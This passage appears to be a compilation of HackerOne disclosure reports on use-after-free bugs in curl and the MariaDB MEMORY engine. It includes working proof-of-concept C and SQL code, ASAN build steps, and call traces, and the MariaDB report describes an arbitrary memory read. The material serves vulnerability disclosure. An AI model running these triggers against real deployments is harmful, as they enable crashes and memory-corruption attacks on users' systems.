static size_t write_cb(char *ptr, size_t size, size_t nmemb, void *u) {
    if(!cleanup_done++) {
        curl_easy_cleanup(g_easy);  /* frees data, multi still references it */
        g_easy = NULL;
    }
    return size * nmemb;
}

static void *http_server(void *arg) {
    int port = *(int *)arg;
    int sfd, cfd, opt = 1;
    struct sockaddr_in addr;
    char buf[4096], body[256], hdr[256];

    sfd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(port);
    bind(sfd, (struct sockaddr *)&addr, sizeof(addr));
    listen(sfd, 1);
    cfd = accept(sfd, NULL, NULL);
    read(cfd, buf, sizeof(buf));
    memset(body, 'A', sizeof(body));
    int hlen = snprintf(hdr, sizeof(hdr),
        "HTTP/1.0 200 OK\r\nContent-Length: %zu\r\n\r\n", sizeof(body));
    write(cfd, hdr, hlen);
    write(cfd, body, sizeof(body));
    usleep(200000);
    close(cfd); close(sfd);
    return NULL;
}

int main(void) {
    signal(SIGPIPE, SIG_IGN);
    int port = 18080;
    pthread_t tid;
    pthread_create(&tid, NULL, http_server, &port);
    usleep(100000);

    curl_global_init(CURL_GL
```

```
docker build -t uaf-001 .
docker run --rm uaf-001
```

## #3733934 CURLOPT_HSTS_CTRL disables shared HSTS without share guard — use-after-free and double-free — curl — - — Use After Free
Source: `hackerone/reports/2026/3733934.md` (https://hackerone.com/reports/3733934)

```
case CURLOPT_HSTS_CTRL:
  if(arg & CURLHSTS_ENABLE) {
    if(!data->hsts) {
      data->hsts = Curl_hsts_init();
      ...
    }
  }
  else
    Curl_hsts_cleanup(&data->hsts);   /* <-- no share guard */
  break;
```

```
if(!data->share || !data->share->hsts)
  /* throw away the HSTS cache unless shared */
  Curl_hsts_cleanup(&data->hsts);
```

```
/*
 * F4 PoC: CURLOPT_HSTS_CTRL UAF / double-free via shared HSTS
 */
#include <stdio.h>
#include <curl/curl.h>

int main(void)
{
  CURLSH *share;
  CURL *easyA, *easyB;
  CURLcode rc;

  curl_global_init(CURL_GLOBAL_DEFAULT);

  share = curl_share_init();
  if(!share) { fprintf(stderr, "share init failed\n"); return 1; }
  curl_share_setopt(share, CURLSHOPT_SHARE, CURL_LOCK_DATA_HSTS);

  easyA = curl_easy_init();
  easyB = curl_easy_init();
  if(!easyA || !easyB) { fprintf(stderr, "easy init failed\n"); return 1; }

  /* Link both easies to the share. After this, both
   * easyA->hsts and easyB->hsts alias share->hsts.
   */
  curl_easy_setopt(easyA, CURLOPT_SHARE, share);
  curl_easy_setopt(easyB, CURLOPT_SHARE, share);

  fprintf(stderr, "[poc] both easies linked; share->hsts is aliased\n");

  /* The bug: CURLOPT_HSTS_CTRL without CURLHSTS_ENABLE.
   * lib/setopt.c:1283-1284 unconditionally calls
   *   Curl_hsts_cleanup(&data->hsts);
   * which frees the shared hsts object via easyA's alias and
   * nulls only easyA->hsts. share->hsts and easyB->hsts still
   * point to the freed object.
   */
  rc = curl_easy_setopt(easyA, CURLOPT_HSTS_CTRL, 0L);
  fprintf(stderr, "[poc] CURLOPT_HSTS_CTRL=0 returned %d\n", (int)rc);

  /* At this point share->hsts is a dangling pointer.
   * Tearing down anything that touches it triggers the UAF/double-free:
   *   - curl_easy_cleanup(easyB) goes through Curl_close, which
   *     checks data->share->hsts (read of freed memory) and may
```

## #3771144 Use-After-Free in BTREE Index Traversal via Stale key_version in heap_update() in MariaDB Server — mariadb — - — Use After Free
Source: `hackerone/reports/2026/3771144.md` (https://hackerone.com/reports/3771144)

```
int heap_update(HP_INFO *info, const uchar *old, const uchar *heap_new)
{
  HP_KEYDEF *keydef, *end, *p_lastinx;
  uchar *pos, *recovery_ptr;
  my_bool auto_key_changed= 0, key_changed= 0;  // <-- never set to 1
  HP_SHARE *share= info->s;
  // ...
  for (keydef= share->keydef, end= keydef + share->keys; keydef < end; keydef++)
  {
    if (hp_rec_key_cmp(keydef, old, heap_new))
    {
      if ((*keydef->delete_key)(info, keydef, old, pos, keydef == p_lastinx) ||
          (*keydef->write_key)(info, keydef, heap_new, pos))
        goto err;
      // NOTE: key_changed = 1; is MISSING HERE
    }
  }
  // ...
  if (key_changed)        // <-- dead code: key_changed is always 0
    share->key_version++;  // NEVER EXECUTES
```

```
    else if (info->last_pos && info->key_version == info->s->key_version)
    {
      pos = tree_search_next(&keyinfo->rb_tree, &info->last_pos,
                             offsetof(TREE_ELEMENT, left),
                             offsetof(TREE_ELEMENT, right));  // <-- UAF dereference
    }
    // ...
    if (pos)
    {
      memcpy(&pos, pos + (*keyinfo->get_key_length)(keyinfo, pos),
             sizeof(uchar*));               // <-- attacker-controlled record ptr
      info->current_ptr = pos;
    }
    // ...
    memcpy(record, pos, (size_t) share->reclength);  // <-- arbitrary read
```

```
-- Single connection, standard privileges only
CREATE TABLE poc (
    k INT,
    pad VARCHAR(200),
    INDEX idx USING BTREE (k)
) ENGINE=MEMORY;

INSERT INTO poc (k, pad) VALUES
  (10,'a'),(20,'b'),(30,'c'),(40,'d'),(50,'e'),
  (60,'f'),(70,'g'),(80,'h'),(90,'i'),(100,'j'),
  (110,'k'),(120,'l'),(130,'m'),(140,'n'),(150,'o'),
  (160,'p'),(170,'q'),(180,'r'),(190,'s'),(200,'t');

HANDLER poc OPEN;

-- Snapshot key_version, fill parents[] with TREE_ELEMENT* pointers
HANDLER poc READ idx FIRST;
HANDLER poc READ idx NEXT;
HANDLER poc READ idx NEXT;
HANDLER poc READ idx NEXT;
HANDLER poc READ idx NEXT;

-- heap_update() frees TREE_ELEMENT nodes but does NOT bump key_version
UPDATE poc SET k = k + 5000 WHERE k BETWEEN 20 AND 180;

-- tree_search_next() dereferences freed TREE_ELEMENT* pointers (use-after-free)
HANDLER poc READ idx NEXT;
```

## #3911968 Heap use-after-free (write) in mev_forget_socket() via reentrant curl_easy_pause() — incomplete fix for CVE-2026-9080 — curl — - — Use After Free
Source: `hackerone/reports/2026/3911968.md` (https://hackerone.com/reports/3911968)

```
    static CURLMcode mev_forget_socket(struct Curl_multi *multi,
                                       struct Curl_easy *data,
                                       curl_socket_t s,
                                       const char *cause)
    {
      struct mev_sh_entry *entry = mev_sh_entry_get(&multi->ev.sh_entries, s);
      int rc = 0;
```

```
      if(entry->announced && multi->socket_cb) {
        mev_in_callback(multi, TRUE);
        rc = multi->socket_cb(data, s, CURL_POLL_REMOVE,
                              multi->socket_userp, entry->user_data);
        mev_in_callback(multi, FALSE);
        entry->announced = FALSE;   /* <-- UAF: entry may already be freed */
      }
```

```
      mev_sh_entry_kill(multi, s);
      ...
    }
```

## #4030333 CVE-2026-92392: HTTP/2 upload Use-After-Free — curl — - — Use After Free
Source: `hackerone/reports/2026/4030333.md` (https://hackerone.com/reports/4030333)

```
wget 'https://curl.se/download/curl-8.22.0.tar.gz'
sha1sum curl-8.22.0.tar.gz # should be 284e444b67f676a281906cfc86e9672780555cd4
tar xf curl-8.22.0.tar.gz
mkdir build ; cd build
# build with ASAN enabled
CC=clang CFLAGS="-O2 -g -fsanitize=address"" LDFLAGS="-Wl,-rpath,/opt/curl-release/lib" \
    ../curl-8.22.0/configure --prefix=/opt/curl-release \
      --enable-static --enable-shared --disable-docs --disable-manual \
      --with-openssl --with-zlib --with-brotli --with-zstd --with-libidn2 \
      --with-nghttp2 --with-libpsl --with-libssh2 --with-gssapi \
      --enable-ldap --enable-ldaps --enable-websockets --enable-mqtt --enable-ipfs \
      --enable-ntlm --enable-smb --enable-httpsig --enable-httpsrr --enable-ssls-export \
    && make -j"$(nproc)"
# make an example file for uploading that satisfies the conditions for the UAF
cat ../docs/*.md > sample_docs.md
# start the malicious server, see attached evil-server.py
 python3 evil-server.py &
# we use --insecure because the server's cert is self signed, not necessary to trigger the bug.
# This should result in an ASAN UAF crash
./src/curl --insecure -T ./sample_docs.md https://127.0.0.1:19170/x
```

```
PHASE 1: upload starts
Curl_req_send()                                 request.c:380    request head + first body bytes -> req.sendbuf
└─ req_flush() -> ... -> cf_h2_send()           http2.c:2197     no stream yet
   └─ h2_submit()                               http2.c:2062
      ├─ http2_data_setup()                     http2.c:361      streams[mid] created
      └─ nghttp2_submit_request(..., data)      http2.c:2133     stream 1 -> data      <- pointer #1 stored

PHASE 2: upload stalls (server can do this by not granting flow-control window)
multistate_performing() -> Curl_sendrecv()      multi.c:2029 -> transfer.c:354
└─ sendrecv_ul() -> Curl_req_send_more()        transfer.c:340 -> request.c:458
   ├─ add_from_client()                         request.c:351    read file -> req.sendbuf (64 KB)
   └─ req_flush() -> ... -> cf_h2_send()        http2.c:2197
      └─ cf_h2_body_send()                                       -> stream->sendbuf
         └─ req_body_read_callback()            http2.c:1577     window is 0 -> NGHTTP2_ERR_DEFERRED (:1625)
   => stream->sendbuf full, req.sendbuf full, nothing moves      <- leftover bytes now parked in req.sendbuf

PHASE 3: server sends HEADERS(200) + RST_STREAM(HTTP_1_1_REQUIRED)
multistate_performing()                         multi.c:2029
├─ result = Curl_sendrecv()                     multi.c:2043 -> transfer.c:354
│  └─ sendrecv_dl()                             transfer.c:220
│     ├─ result = xfer_recv_resp()              transfer.c:
```

```
    ../curl-8.22.0/configure --prefix=/opt/curl-release \
      --enable-static --enable-shared --disable-docs --disable-manual \
      --with-openssl --with-zlib --with-brotli --with-zstd --with-libidn2 \
      --with-nghttp2 --with-libpsl --with-libssh2 --with-gssapi \
      --enable-ldap --enable-ldaps --enable-websockets --enable-mqtt --enable-ipfs \
      --enable-ntlm --enable-smb --enable-httpsig --enable-httpsrr --enable-ssls-export \
    && make -j"$(nproc)"
```

